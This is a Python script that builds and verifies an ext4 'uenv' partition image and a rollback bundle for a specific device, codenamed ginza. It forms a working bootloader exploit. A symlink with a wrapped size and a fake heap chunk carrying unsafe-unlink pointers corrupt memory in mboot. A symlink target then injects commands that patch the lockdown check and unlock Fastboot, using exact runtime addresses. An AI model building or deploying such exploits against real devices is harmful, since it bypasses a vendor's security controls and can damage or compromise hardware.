#!/usr/bin/env python3
"""Build and verify the Ginza uenv Fastboot-unlock image and rollback bundle."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import shutil
import struct
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path


MBOOT_SIZE = 10 * 1024 * 1024
MBOOT_SHA256 = "f95082e5eb03bd813ba1b82d824c59693e22c5bc60fad309c8dc3a7cabebee11"
UENV_SIZE = 16 * 1024 * 1024
UENV_UUID = bytes.fromhex("57f8f4bcabf4655fbf67946fc0f9f25b")
BLOCK_SIZE = 4096
INODE_SIZE = 256

LINK_BASE = 0x27400000
FILE_CODE_OFFSET = 0x400
RELOCATION_DELTA = 0x388D0000

IS_LOCKDOWN_PATCH_LINK = 0x274984D5
IS_LOCKDOWN_PATCH_RUNTIME = IS_LOCKDOWN_PATCH_LINK + RELOCATION_DELTA
FLUSH_DCACHE_LINK = 0x2749AB8C
FLUSH_DCACHE_RUNTIME = FLUSH_DCACHE_LINK + RELOCATION_DELTA
INVALIDATE_ICACHE_LINK = 0x2749ABFC
INVALIDATE_ICACHE_RUNTIME = INVALIDATE_ICACHE_LINK + RELOCATION_DELTA
COMMAND_GADGET_LINK = 0x274AF1C0
COMMAND_GADGET_RUNTIME = COMMAND_GADGET_LINK + RELOCATION_DELTA

SAVED_RETURN_ADDRESS = 0x5D93CD98
UNLINK_FD = COMMAND_GADGET_RUNTIME
UNLINK_BK = SAVED_RETURN_ADDRESS - 16

COMMAND = (
    f"mw.b {IS_LOCKDOWN_PATCH_RUNTIME:x} e7;"
    f"go {FLUSH_DCACHE_RUNTIME:x};"
    f"go {INVALIDATE_ICACHE_RUNTIME:x};fas 0"
).encode("ascii")
SYMLINK_TARGET = b"d/x/" + COMMAND

MBOOT_ASSERTIONS = {
    0x274984D4: bytes.fromhex("e0179f1afd7bc1a8"),
    FLUSH_DCACHE_LINK: bytes.fromhex("000080d2e9ffff17200080d2e7ffff17"),
    INVALIDATE_ICACHE_LINK: bytes.fromhex("1f7108d5df3f03d5c0035fd6000080d2"),
    COMMAND_GADGET_LINK: bytes.fromhex(
        "0200805201008012e00317aa8a460094f35341a9f55b42a9f76343a9fd7bcca8"
    ),
    0x27564594: bytes.fromhex(
        "fd7bb8a9fd030091f35301a9f30300aaf55b02a9f60301aa"
    ),
    0x274B91B8: bytes.fromhex(
        "fd7bbda9fd030091f35301a9f51300f9f50300aa33423bd5"
    ),
}

RESTORE_IMAGE_ADDRESS = 0x31000000
RESTORE_READBACK_ADDRESS = 0x32000000
PROBE_SCRATCH_ADDRESS = 0x32000000
PROBE_SCRIPT = (
    b"echo GINZA-FASTBOOT-UNLOCK-BEGIN\n"
    b"mw.l 0x32000000 0x474e5a41 0x1\n"
    b"mw.l 0x32000004 0x474e5a41 0x1\n"
    b"cmp.l 0x32000000 0x32000004 0x1\n"
    b"echo GINZA-FASTBOOT-UNLOCK-VERIFIED\n\0"
)
RESTORE_SCRIPT = (
    b"echo GINZA-UENV-RESTORE-BEGIN\n"
    b"partition write mmc 0 uenv 0x31000000 0x1000000\n"
    b"partition read mmc 0 uenv 0x32000000 0x1000000\n"
    b"cmp.b 0x31000000 0x32000000 0x1000000\n"
    b"echo GINZA-UENV-RESTORE-VERIFIED\n\0"
)

EXPECTED_STOCK_ENV_SHA256 = (
    "ed362a2f4ce8b15955e67e6e050f0e913c997e5becf404af040ce7f986de081f"
)
PRESERVED_PATHS = (
    "/uenv_reload",
    "/screen_state",
    "/misc/bluedroid/wake_on_ble.conf",
    "/uboot.env",
    "/uboot.env.stock-ed362a2f",
)


class BundleError(RuntimeError):
    """The bundle does not satisfy the exact Ginza target invariants."""


def sha256_bytes(content: bytes) -> str:
    return hashlib.sha256(content).hexdigest()


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def read_exact(path: Path, size: int, label: str) -> bytes:
    try:
        content = path.read_bytes()
    except OSError as exc:
        raise BundleError(f"cannot read {label} {path}: {exc}") from exc
    if len(content) != size:
        raise BundleError(f"{label} is {len(content)} bytes; expected {size}")
    return content


def link_to_file_offset(address: int) -> int:
    if address < LINK_BASE:
        raise BundleError(f"link address 0x{address:x} is below the image base")
    return address - LINK_BASE + FILE_CODE_OFFSET


def validate_mboot(path: Path) -> str:
    content = read_exact(path, MBOOT_SIZE, "mboot image")
    digest = sha256_bytes(content)
    if digest != MBOOT_SHA256:
        raise BundleError(f"mboot SHA-256 is {digest}; expected {MBOOT_SHA256}")
    for address, expected in MBOOT_ASSERTIONS.items():
        offset = link_to_file_offset(address)
        actual = content[offset : offset + len(expected)]
        if actual != expected:
            raise BundleError(
                f"mboot bytes at link address 0x{address:x} are {actual.hex()}; "
                f"expected {expected.hex()}"
            )
    return digest


@dataclass(frozen=True)
class Ext4Geometry:
    block_size: int
    inode_size: int
    inodes_per_group: int
    inode_table_block: int
    uuid: bytes


class Ext4Image:
    def __init__(self, content: bytes | bytearray, label: str):
        if len(content) != UENV_SIZE:
            raise BundleError(f"{label} is {len(content)} bytes; expected {UENV_SIZE}")
        self.content = content
        self.label = label
        sb = 1024
        if struct.unpack_from("<H", content, sb + 0x38)[0] != 0xEF53:
            raise BundleError(f"{label} is not an ext4 filesystem")
        block_size = 1024 << struct.unpack_from("<I", content, sb + 0x18)[0]
        inode_size = struct.unpack_from("<H", content, sb + 0x58)[0]
        inodes_per_group = struct.unpack_from("<I", content, sb + 0x28)[0]
        uuid = bytes(content[sb + 0x68 : sb + 0x78])
        descriptor_offset = block_size if block_size > 1024 else 2 * block_size
        inode_table_block = struct.unpack_from("<I", content, descriptor_offset + 8)[0]
        self.geometry = Ext4Geometry(
            block_size=block_size,
            inode_size=inode_size,
            inodes_per_group=inodes_per_group,
            inode_table_block=inode_table_block,
            uuid=uuid,
        )
        if block_size != BLOCK_SIZE or inode_size != INODE_SIZE:
            raise BundleError(
                f"{label} geometry is block={block_size}, inode={inode_size}; "
                f"expected block={BLOCK_SIZE}, inode={INODE_SIZE}"
            )
        if uuid != UENV_UUID:
            raise BundleError(f"{label} UUID is {uuid.hex()}; expected {UENV_UUID.hex()}")
        if inodes_per_group < 32 or inode_table_block == 0:
            raise BundleError(f"{label} has invalid inode geometry")

    def inode_offset(self, inode: int) -> int:
        if inode < 1 or inode > self.geometry.inodes_per_group:
            raise BundleError(f"inode {inode} is outside the supported first group")
        return (
            self.geometry.inode_table_block * self.geometry.block_size
            + (inode - 1) * self.geometry.inode_size
        )

    def inode(self, inode: int) -> bytes:
        offset = self.inode_offset(inode)
        return bytes(self.content[offset : offset + self.geometry.inode_size])

    def inode_mode(self, inode: int) -> int:
        return struct.unpack_from("<H", self.content, self.inode_offset(inode))[0]

    def inode_size(self, inode: int) -> int:
        offset = self.inode_offset(inode)
        low = struct.unpack_from("<I", self.content, offset + 4)[0]
        high = struct.unpack_from("<I", self.content, offset + 0x6C)[0]
        return low | (high << 32)

    def inode_flags(self, inode: int) -> int:
        return struct.unpack_from("<I", self.content, self.inode_offset(inode) + 0x20)[0]

    def i_block(self, inode: int) -> bytes:
        offset = self.inode_offset(inode) + 0x28
        return bytes(self.content[offset : offset + 60])

    def extent_blocks(self, inode: int) -> list[int]:
        block = self.i_block(inode)
        if not self.inode_flags(inode) & 0x80000:
            count = (
                self.inode_size(inode) + self.geometry.block_size - 1
            ) // self.geometry.block_size
            if count > 12:
                raise BundleError(
                    f"{self.label} inode {inode} requires unsupported indirect blocks"
                )
            direct = list(struct.unpack_from("<12I", block))[:count]
            if any(number == 0 for number in direct):
                raise BundleError(f"{self.label} inode {inode} has a sparse direct block map")
            return direct
        magic, entries, _maximum, depth, _generation = struct.unpack_from(
            "<HHHHI", block
        )
        if magic != 0xF30A or depth not in (0, 1):
            raise BundleError(
                f"{self.label} inode {inode} has an unsupported extent tree"
            )
        if depth == 1:
            if entries != 1:
                raise BundleError(
                    f"{self.label} inode {inode} has an unsupported depth-1 extent tree"
                )
            logical, leaf_low, leaf_high, _unused = struct.unpack_from(
                "<IIHH", block, 12
            )
            if logical != 0:
                raise BundleError(
                    f"{self.label} inode {inode} has a nonzero extent-index key"
                )
            leaf_number = leaf_low | (leaf_high << 32)
            leaf_offset = leaf_number * self.geometry.block_size
            block = bytes(
                self.content[
                    leaf_offset : leaf_offset + self.geometry.block_size
                ]
            )
            magic, entries, _maximum, depth, _generation = struct.unpack_from(
                "<HHHHI", block
            )
            if magic != 0xF30A or depth != 0:
                raise BundleError(
                    f"{self.label} inode {inode} has an invalid extent leaf"
                )
        result: list[int] = []
        for index in range(entries):
            logical, length, start_high, start_low = struct.unpack_from(
                "<IHHI", block, 12 + 12 * index
            )
            if length & 0x8000:
                raise BundleError(f"{self.label} inode {inode} has an unwritten extent")
            length &= 0x7FFF
            start = start_low | (start_high << 32)
            if logical != len(result):
                raise BundleError(
                    f"{self.label} inode {inode} has a non-contiguous logical extent"
                )
            result.extend(range(start, start + length))
        return result

    def directory_entries(self, inode: int) -> dict[str, int]:
        entries: dict[str, int] = {}
        size = self.inode_size(inode)
        blocks = self.extent_blocks(inode)
        remaining = size
        for block_number in blocks:
            chunk = bytes(
                self.content[
                    block_number * self.geometry.block_size :
                    (block_number + 1) * self.geometry.block_size
                ]
            )
            limit = min(len(chunk), remaining)
            offset = 0
            while offset < limit:
                child, record_length, name_length, _file_type = struct.unpack_from(
                    "<IHBB", chunk, offset
                )
                if record_length < 8 or record_length % 4 or offset + record_length > limit:
                    raise BundleError(
                        f"{self.label} inode {inode} has an invalid directory record"
                    )
                if child:
                    raw_name = chunk[offset + 8 : offset + 8 + name_length]
                    try:
                        name = raw_name.decode("utf-8")
                    except UnicodeDecodeError as exc:
                        raise BundleError(
                            f"{self.label} inode {inode} has a non-UTF-8 name"
                        ) from exc
                    if name in entries:
                        raise BundleError(
                            f"{self.label} inode {inode} contains duplicate name {name!r}"
                        )
                    entries[name] = child
                offset += record_length
            remaining -= limit
            if remaining <= 0:
                break
        return entries

    def path_inode(self, path: str) -> int:
        components = [component for component in path.split("/") if component]
        inode = 2
        for component in components:
            entries = self.directory_entries(inode)
            try:
                inode = entries[component]
            except KeyError as exc:
                raise BundleError(f"{self.label} has no path {path}") from exc
        return inode


def run_tool(
    command: list[str], *, input_text: str | None = None
) -> subprocess.CompletedProcess[str]:
    try:
        return subprocess.run(
            command,
            input=input_text,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            check=False,
        )
    except OSError as exc:
        raise BundleError(f"cannot run {command[0]}: {exc}") from exc


def require_tool(name: str) -> str:
    path = shutil.which(name)
    if path is None:
        raise BundleError(f"required tool is not in PATH: {name}")
    return path


def fsck_image(path: Path, *, repair: bool) -> str:
    e2fsck = require_tool("e2fsck")
    flags = "-fy" if repair else "-fn"
    result = run_tool([e2fsck, flags, str(path)])
    if result.returncode & (4 | 8 | 16 | 32 | 128):
        raise BundleError(
            f"e2fsck {flags} failed for {path} with status {result.returncode}:\n"
            f"{result.stdout}"
        )
    return result.stdout


def debugfs_batch(image: Path, commands: str) -> str:
    debugfs = require_tool("debugfs")
    with tempfile.NamedTemporaryFile("w", encoding="utf-8", delete=False) as stream:
        stream.write(commands)
        command_path = Path(stream.name)
    try:
        result = run_tool([debugfs, "-w", "-f", str(command_path), str(image)])
    finally:
        command_path.unlink(missing_ok=True)
    if result.returncode != 0 or "Command not found" in result.stdout:
        raise BundleError(f"debugfs failed for {image}:\n{result.stdout}")
    return result.stdout


def debugfs_dump(image: Path, path: str) -> bytes:
    debugfs = require_tool("debugfs")
    with tempfile.TemporaryDirectory(prefix="ginza-uenv-dump-") as directory:
        output = Path(directory) / "content"
        result = run_tool([debugfs, "-R", f"dump {path} {output}", str(image)])
        if result.returncode != 0 or not output.exists():
            raise BundleError(
                f"cannot dump {path} from {image} with debugfs:\n{result.stdout}"
            )
        return output.read_bytes()


def validate_stock_files(image: Path) -> dict[str, dict[str, object]]:
    result: dict[str, dict[str, object]] = {}
    for path in PRESERVED_PATHS:
        content = debugfs_dump(image, path)
        result[path] = {"size": len(content), "sha256": sha256_bytes(content)}
    if result["/uboot.env"]["sha256"] != EXPECTED_STOCK_ENV_SHA256:
        raise BundleError("current /uboot.env does not match the exact stock environment")
    if result["/uboot.env.stock-ed362a2f"] != result["/uboot.env"]:
        raise BundleError("the stock environment backup does not match /uboot.env")
    return result


def build_restore_image(stock: bytes) -> bytes:
    if len(RESTORE_SCRIPT) >= UENV_SIZE:
        raise BundleError("restore script does not fit before the stock image")
    payload = bytearray(2 * UENV_SIZE)
    payload[: len(RESTORE_SCRIPT)] = RESTORE_SCRIPT
    payload[UENV_SIZE:] = stock
    return bytes(payload)


def parse_candidate_layout(candidate: Ext4Image) -> dict[str, int]:
    root = candidate.directory_entries(2)
    required = {"d", "uboot.env", "leaf", "uboot.env.stock-ed362a2f"}
    missing = required - root.keys()
    if missing:
        raise BundleError(f"candidate root directory lacks: {', '.join(sorted(missing))}")
    directory_inode = root["d"]
    malicious_inode = candidate.directory_entries(directory_inode).get("x")
    if malicious_inode is None:
        raise BundleError("candidate /d directory lacks x")
    outer_inode = root["uboot.env"]
    leaf_inode = root["leaf"]

    directory_block = _validate_depth_one_directory(candidate, directory_inode)
    leaf_blocks = candidate.extent_blocks(leaf_inode)
    if len(leaf_blocks) != 1:
        raise BundleError("candidate /leaf does not occupy exactly one block")
    leaf_block = leaf_blocks[0]
    _validate_malicious_symlink(candidate, malicious_inode, leaf_block)
    _validate_outer_symlink(candidate, outer_inode)
    _validate_payload(candidate, leaf_block, directory_block)
    return {
        "directory_inode": directory_inode,
        "malicious_inode": malicious_inode,
        "outer_inode": outer_inode,
        "leaf_inode": leaf_inode,
        "directory_block": directory_block,
        "leaf_block": leaf_block,
    }


def _validate_depth_one_directory(image: Ext4Image, inode: int) -> int:
    block = image.i_block(inode)
    magic, entries, maximum, depth, generation = struct.unpack_from("<HHHHI", block)
    if (magic, entries, maximum, depth, generation) != (0xF30A, 1, 4, 1, 0):
        raise BundleError("candidate /d extent root is not the required depth-1 tree")
    logical, leaf_low, leaf_high, unused = struct.unpack_from("<IIHH", block, 12)
    if logical != 0 or leaf_high != 0 or unused != 0:
        raise BundleError("candidate /d extent index is invalid")
    leaf_offset = leaf_low * BLOCK_SIZE
    header = struct.unpack_from("<HHHHI", image.content, leaf_offset)
    if header != (0xF30A, 1, (BLOCK_SIZE - 12) // 12, 0, 0):
        raise BundleError("candidate shared extent leaf has an invalid header")
    logical, length, start_high, start_low = struct.unpack_from(
        "<IHHI", image.content, leaf_offset + 12
    )
    if (logical, length, start_high) != (0, 1, 0):
        raise BundleError("candidate shared extent leaf has an invalid extent")
    return start_low


def _validate_malicious_symlink(image: Ext4Image, inode: int, leaf_block: int) -> None:
    if image.inode_mode(inode) & 0xF000 != 0xA000:
        raise BundleError("candidate /d/x is not a symlink inode")
    if image.inode_size(inode) != 0xFFFFFFFF:
        raise BundleError("candidate /d/x does not have wrapped size 0xffffffff")
    if image.inode_flags(inode) != 0:
        raise BundleError("candidate /d/x still has extents enabled")
    direct = struct.unpack_from("<15I", image.i_block(inode))
    if direct[:2] != (leaf_block, 0x100000) or any(direct[2:]):
        raise BundleError("candidate /d/x direct-block array is invalid")


def _validate_outer_symlink(image: Ext4Image, inode: int) -> None:
    if image.inode_mode(inode) & 0xF000 != 0xA000:
        raise BundleError("candidate /uboot.env is not a symlink")
    if image.inode_size(inode) != len(SYMLINK_TARGET):
        raise BundleError("candidate /uboot.env has the wrong target length")
    if image.i_block(inode)[: len(SYMLINK_TARGET)] != SYMLINK_TARGET:
        raise BundleError("candidate /uboot.env has the wrong target")


def _validate_payload(image: Ext4Image, leaf_block: int, directory_block: int) -> None:
    offset = leaf_block * BLOCK_SIZE
    leaf = bytes(image.content[offset : offset + BLOCK_SIZE])
    if struct.unpack_from("<Q", leaf, 0x18)[0] != 0xFC1:
        raise BundleError("candidate fake next-chunk size is invalid")
    if struct.unpack_from("<Q", leaf, 0x20)[0] != UNLINK_FD:
        raise BundleError("candidate unsafe-unlink FD is invalid")
    if struct.unpack_from("<Q", leaf, 0x28)[0] != UNLINK_BK:
        raise BundleError("candidate unsafe-unlink BK is invalid")
    if struct.unpack_from("<Q", leaf, 0xFD0)[0] != 0xFC0:
        raise BundleError("candidate post-chunk prev_size is invalid")
    if struct.unpack_from("<Q", leaf, 0xFD8)[0] != 0x30:
        raise BundleError("candidate post-chunk size is invalid")
    extent = struct.unpack_from("<IHHI", leaf, 12)
    if extent != (0, 1, 0, directory_block):
        raise BundleError("candidate shared leaf does not map /d's data block")


def patch_layout(layout: bytes, layout_info: dict[str, int]) -> bytes:
    content = bytearray(layout)
    image = Ext4Image(content, "layout image")
    directory_inode = layout_info["directory_inode"]
    malicious_inode = layout_info["malicious_inode"]
    outer_inode = layout_info["outer_inode"]
    directory_block = layout_info["directory_block"]
    leaf_block = layout_info["leaf_block"]

    directory_offset = image.inode_offset(directory_inode)
    malicious_offset = image.inode_offset(malicious_inode)
    outer_offset = image.inode_offset(outer_inode)

    extent_root = (
        struct.pack("<HHHHI", 0xF30A, 1, 4, 1, 0)
        + struct.pack("<IIHH", 0, leaf_block, 0, 0)
    )
    content[directory_offset + 0x28 : directory_offset + 0x28 + 60] = (
        extent_root + bytes(60 - len(extent_root))
    )

    struct.pack_into("<I", content, malicious_offset + 4, 0xFFFFFFFF)
    struct.pack_into("<I", content, malicious_offset + 0x20, 0)
    direct = struct.pack("<II", leaf_block, 0x100000) + bytes(52)
    content[malicious_offset + 0x28 : malicious_offset + 0x28 + 60] = direct

    struct.pack_into("<I", content, outer_offset + 4, len(SYMLINK_TARGET))
    content[outer_offset + 0x28 : outer_offset + 0x28 + 60] = (
        SYMLINK_TARGET + bytes(60 - len(SYMLINK_TARGET))
    )

    leaf = bytearray(b"P" * BLOCK_SIZE)
    leaf[:12] = struct.pack("<HHHHI", 0xF30A, 1, (BLOCK_SIZE - 12) // 12, 0, 0)
    leaf[12:24] = struct.pack("<IHHI", 0, 1, 0, directory_block)
    struct.pack_into("<Q", leaf, 0x18, 0xFC1)
    struct.pack_into("<Q", leaf, 0x20, UNLINK_FD)
    struct.pack_into("<Q", leaf, 0x28, UNLINK_BK)
    struct.pack_into("<Q", leaf, 0xFD0, 0xFC0)
    struct.pack_into("<Q", leaf, 0xFD8, 0x30)
    content[leaf_block * BLOCK_SIZE : (leaf_block + 1) * BLOCK_SIZE] = leaf
    return bytes(content)


def inspect_unpatched_layout(path: Path) -> dict[str, int]:
    content = read_exact(path, UENV_SIZE, "layout image")
    image = Ext4Image(content, "layout image")
    root = image.directory_entries(2)
    for name in ("d", "uboot.env", "leaf"):
        if name not in root:
            raise BundleError(f"layout image lacks /{name}")
    directory_inode = root["d"]
    malicious_inode = image.directory_entries(directory_inode).get("x")
    if malicious_inode is None:
        raise BundleError("layout image lacks /d/x")
    outer_inode = root["uboot.env"]
    leaf_inode = root["leaf"]
    directory_blocks = image.extent_blocks(directory_inode)
    malicious_blocks = image.extent_blocks(malicious_inode)
    leaf_blocks = image.extent_blocks(leaf_inode)
    if len(directory_blocks) != 1 or len(malicious_blocks) != 1 or len(leaf_blocks) != 1:
        raise BundleError("debugfs did not allocate one block for each layout object")
    if image.inode_size(malicious_inode) != 100:
        raise BundleError("debugfs did not create /d/x as an external symlink")
    if image.i_block(outer_inode)[:11] != b"d/x/version":
        raise BundleError("debugfs did not create the expected inline outer symlink")
    return {
        "directory_inode": directory_inode,
        "malicious_inode": malicious_inode,
        "outer_inode": outer_inode,
        "leaf_inode": leaf_inode,
        "directory_block": directory_blocks[0],
        "placeholder_block": malicious_blocks[0],
        "leaf_block": leaf_blocks[0],
    }


def compare_preserved(base: Ext4Image, candidate: Ext4Image) -> list[int]:
    original_root = base.directory_entries(2)
    preserved_inodes = set(range(12, 19))
    for path in PRESERVED_PATHS:
        if path == "/uboot.env":
            inode = original_root["uboot.env"]
            if inode not in preserved_inodes:
                raise BundleError("stock /uboot.env uses an unexpected inode")
            continue
        inode = base.path_inode(path)
        if inode not in preserved_inodes:
            raise BundleError(f"stock path {path} uses an unexpected inode")
        if candidate.path_inode(path) != inode:
            raise BundleError(f"candidate changes the inode for preserved path {path}")
    for inode in sorted(preserved_inodes):
        if base.inode(inode) != candidate.inode(inode):
            raise BundleError(f"candidate changes preserved inode {inode}")
        mode = base.inode_mode(inode) & 0xF000
        if mode in (0x4000, 0x8000):
            for block in base.extent_blocks(inode):
                start = block * BLOCK_SIZE
                if base.content[start : start + BLOCK_SIZE] != candidate.content[
                    start : start + BLOCK_SIZE
                ]:
                    raise BundleError(
                        f"candidate changes data block {block} for preserved inode {inode}"
                    )
    return sorted(preserved_inodes)


def write_new(path: Path, content: bytes) -> None:
    if path.exists():
        raise BundleError(f"refusing to replace existing output {path}")
    try:
        with path.open("xb") as stream:
            stream.write(content)
            stream.flush()
            os.fsync(stream.fileno())
    except OSError as exc:
        raise BundleError(f"cannot write {path}: {exc}") from exc


def build_bundle(mboot: Path, stock_path: Path, output: Path) -> dict[str, object]:
    mboot_digest = validate_mboot(mboot)
    stock = read_exact(stock_path, UENV_SIZE, "stock uenv image")
    Ext4Image(stock, "stock uenv image")
    stock_digest = sha256_bytes(stock)

    if output.exists():
        raise BundleError(f"refusing to use existing output directory {output}")
    output.mkdir(parents=True)
    clean_path = output / "uenv-clean.img"
    layout_path = output / "uenv-layout.img"
    candidate_path = output / "uenv-fastboot.img"
    probe_path = output / "fastboot-unlock-probe-mscript.img"
    restore_path = output / "uenv-restore-mscript.img"
    manifest_path = output / "manifest.json"
    fsck_log_path = output / "e2fsck.log"
    debugfs_log_path = output / "debugfs.log"

    shutil.copyfile(stock_path, clean_path)
    fsck_log = fsck_image(clean_path, repair=True)
    fsck_log += "\nVERIFY\n" + fsck_image(clean_path, repair=False)
    fsck_log_path.write_text(fsck_log, encoding="utf-8")
    stock_files = validate_stock_files(clean_path)

    shutil.copyfile(clean_path, layout_path)
    leaf_path = output / ".leaf-placeholder"
    leaf_path.write_bytes(b"L" * BLOCK_SIZE)
    commands = (
        "mkdir /d\n"
        f"symlink /d/x {'A' * 100}\n"
        "unlink /uboot.env\n"
        "symlink /uboot.env d/x/version\n"
        f"write {leaf_path} /leaf\n"
    )
    debugfs_log = debugfs_batch(layout_path, commands)
    debugfs_log_path.write_text(debugfs_log, encoding="utf-8")
    leaf_path.unlink()

    layout_info = inspect_unpatched_layout(layout_path)
    layout = layout_path.read_bytes()
    candidate = patch_layout(layout, layout_info)
    write_new(candidate_path, candidate)
    write_new(probe_path, PROBE_SCRIPT)
    restore = build_restore_image(stock)
    write_new(restore_path, restore)

    base_image = Ext4Image(clean_path.read_bytes(), "clean base")
    candidate_image = Ext4Image(candidate, "candidate")
    candidate_info = parse_candidate_layout(candidate_image)
    preserved_inodes = compare_preserved(base_image, candidate_image)

    manifest: dict[str, object] = {
        "format": 2,
        "target": {
            "model": "AFTHU71990",
            "device": "ginza",
            "slot": "_b",
            "mboot_size": MBOOT_SIZE,
            "mboot_sha256": mboot_digest,
        },
        "files": {
            "stock": {
                "path": str(stock_path.resolve()),
                "size": UENV_SIZE,
                "sha256": stock_digest,
            },
            "clean": {
                "path": clean_path.name,
                "size": UENV_SIZE,
                "sha256": sha256_file(clean_path),
            },
            "layout": {
                "path": layout_path.name,
                "size": UENV_SIZE,
                "sha256": sha256_file(layout_path),
            },
            "candidate": {
                "path": candidate_path.name,
                "size": UENV_SIZE,
                "sha256": sha256_file(candidate_path),
            },
            "probe": {
                "path": probe_path.name,
                "size": len(PROBE_SCRIPT),
                "sha256": sha256_file(probe_path),
            },
            "restore": {
                "path": restore_path.name,
                "size": 2 * UENV_SIZE,
                "sha256": sha256_file(restore_path),
            },
        },
        "filesystem": {
            "uuid": UENV_UUID.hex(),
            "block_size": BLOCK_SIZE,
            "inode_size": INODE_SIZE,
            "layout": candidate_info,
            "preserved_inodes": preserved_inodes,
            "preserved_files": stock_files,
        },
        "exploit": {
            "command": COMMAND.decode("ascii"),
            "symlink_target": SYMLINK_TARGET.decode("ascii"),
            "is_lockdown_patch_runtime": f"0x{IS_LOCKDOWN_PATCH_RUNTIME:x}",
            "flush_dcache_runtime": f"0x{FLUSH_DCACHE_RUNTIME:x}",
            "invalidate_icache_runtime": f"0x{INVALIDATE_ICACHE_RUNTIME:x}",
            "command_gadget_runtime": f"0x{COMMAND_GADGET_RUNTIME:x}",
            "saved_return_address": f"0x{SAVED_RETURN_ADDRESS:x}",
            "unlink_fd": f"0x{UNLINK_FD:x}",
            "unlink_bk": f"0x{UNLINK_BK:x}",
        },
        "fastboot_probe": {
            "script": PROBE_SCRIPT.rstrip(b"\0").decode("ascii"),
            "scratch_address": f"0x{PROBE_SCRATCH_ADDRESS:x}",
        },
        "restore": {
            "script": RESTORE_SCRIPT.rstrip(b"\0").decode("ascii"),
            "stock_address": f"0x{RESTORE_IMAGE_ADDRESS:x}",
            "readback_address": f"0x{RESTORE_READBACK_ADDRESS:x}",
        },
    }
    manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n")
    verify_bundle(mboot, output, stock_override=stock_path)
    return manifest


def manifest_file(bundle: Path, manifest: dict[str, object], name: str) -> Path:
    files = manifest.get("files")
    if not isinstance(files, dict) or name not in files:
        raise BundleError(f"manifest lacks files.{name}")
    entry = files[name]
    if not isinstance(entry, dict):
        raise BundleError(f"manifest files.{name} is invalid")
    raw_path = entry.get("path")
    if not isinstance(raw_path, str):
        raise BundleError(f"manifest files.{name}.path is invalid")
    path = Path(raw_path)
    return path if path.is_absolute() else bundle / path


def verify_file_entry(path: Path, entry: object, label: str) -> None:
    if not isinstance(entry, dict):
        raise BundleError(f"manifest entry for {label} is invalid")
    expected_size = entry.get("size")
    expected_digest = entry.get("sha256")
    if not isinstance(expected_size, int) or not isinstance(expected_digest, str):
        raise BundleError(f"manifest metadata for {label} is invalid")
    try:
        size = path.stat().st_size
    except OSError as exc:
        raise BundleError(f"cannot stat {label} {path}: {exc}") from exc
    if size != expected_size:
        raise BundleError(f"{label} is {size} bytes; manifest requires {expected_size}")
    digest = sha256_file(path)
    if digest != expected_digest:
        raise BundleError(
            f"{label} SHA-256 is {digest}; manifest requires {expected_digest}"
        )


def verify_bundle(
    mboot: Path, bundle: Path, *, stock_override: Path | None = None
) -> dict[str, object]:
    validate_mboot(mboot)
    manifest_path = bundle / "manifest.json"
    try:
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise BundleError(f"cannot read manifest {manifest_path}: {exc}") from exc
    if manifest.get("format") != 2:
        raise BundleError("unsupported manifest format")
    files = manifest.get("files")
    if not isinstance(files, dict):
        raise BundleError("manifest files section is invalid")

    paths: dict[str, Path] = {}
    for name in ("clean", "layout", "candidate", "probe", "restore"):
        path = manifest_file(bundle, manifest, name)
        verify_file_entry(path, files.get(name), name)
        paths[name] = path
    stock_path = stock_override or manifest_file(bundle, manifest, "stock")
    verify_file_entry(stock_path, files.get("stock"), "stock")
    paths["stock"] = stock_path

    stock = read_exact(stock_path, UENV_SIZE, "stock image")
    clean = read_exact(paths["clean"], UENV_SIZE, "clean image")
    candidate = read_exact(paths["candidate"], UENV_SIZE, "candidate image")
    try:
        probe = paths["probe"].read_bytes()
    except OSError as exc:
        raise BundleError(f"cannot read Fastboot probe image: {exc}") from exc
    restore = read_exact(paths["restore"], 2 * UENV_SIZE, "restore image")
    Ext4Image(stock, "stock image")
    clean_image = Ext4Image(clean, "clean image")
    candidate_image = Ext4Image(candidate, "candidate image")
    layout_info = parse_candidate_layout(candidate_image)
    preserved_inodes = compare_preserved(clean_image, candidate_image)

    filesystem = manifest.get("filesystem")
    if not isinstance(filesystem, dict):
        raise BundleError("manifest filesystem section is invalid")
    if filesystem.get("layout") != layout_info:
        raise BundleError("candidate layout does not match the manifest")
    if filesystem.get("preserved_inodes") != preserved_inodes:
        raise BundleError("preserved inode list does not match the manifest")
    for path, metadata in validate_stock_files(paths["clean"]).items():
        preserved = filesystem.get("preserved_files")
        if not isinstance(preserved, dict) or preserved.get(path) != metadata:
            raise BundleError(f"preserved file {path} does not match the manifest")

    if probe != PROBE_SCRIPT:
        raise BundleError("Fastboot probe image has the wrong mscript")
    fastboot_probe = manifest.get("fastboot_probe")
    if not isinstance(fastboot_probe, dict) or fastboot_probe != {
        "script": PROBE_SCRIPT.rstrip(b"\0").decode("ascii"),
        "scratch_address": f"0x{PROBE_SCRATCH_ADDRESS:x}",
    }:
        raise BundleError("Fastboot probe manifest is invalid")

    if restore[: len(RESTORE_SCRIPT)] != RESTORE_SCRIPT:
        raise BundleError("restore image has the wrong mscript")
    if any(restore[len(RESTORE_SCRIPT) : UENV_SIZE]):
        raise BundleError("restore image padding before the stock image is not zero")
    if restore[UENV_SIZE:] != stock:
        raise BundleError("restore image does not embed the exact stock partition")

    exploit = manifest.get("exploit")
    if not isinstance(exploit, dict) or exploit.get("command") != COMMAND.decode("ascii"):
        raise BundleError("manifest command does not match the verified candidate")
    if len(COMMAND) != 46 or len(SYMLINK_TARGET) != 50:
        raise BundleError("internal command length invariant changed")
    return manifest


def print_manifest_summary(manifest: dict[str, object], bundle: Path) -> None:
    files = manifest["files"]
    assert isinstance(files, dict)
    print(f"verified bundle: {bundle}")
    for name in ("stock", "clean", "candidate", "probe", "restore"):
        entry = files[name]
        assert isinstance(entry, dict)
        print(f"{name:9s} {entry['sha256']}  {entry['size']} bytes")
    filesystem = manifest["filesystem"]
    assert isinstance(filesystem, dict)
    print(f"layout    {filesystem['layout']}")
    print(f"command   {COMMAND.decode('ascii')}")


